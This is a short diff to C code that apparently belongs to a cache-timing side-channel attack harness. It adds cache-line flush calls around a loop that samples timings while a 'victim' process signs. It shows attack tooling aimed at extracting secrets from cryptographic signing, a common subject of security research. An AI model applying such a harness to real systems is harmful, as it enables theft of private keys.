@@ -192,7 +192,7 @@ int main(int argc, char **argv)
 
 			// Request the victim to sign
 			sharestruct->sign_requested = victim_iteration_no;
-
+			_mm_clflush(current);
 			// Start monitoring loop
 			for (i = 0; i < MAXSAMPLES; i++) {
 
@@ -240,6 +240,7 @@ int main(int argc, char **argv)
 					: "=rm"(samples[i]), "+rm"(current) /* output */
 					:
 					: "rax", "rcx", "rdx", "r8", "memory");
+				_mm_clflush(current);
 			}
 
 			// Check that the victim's iteration of interest is actually ended
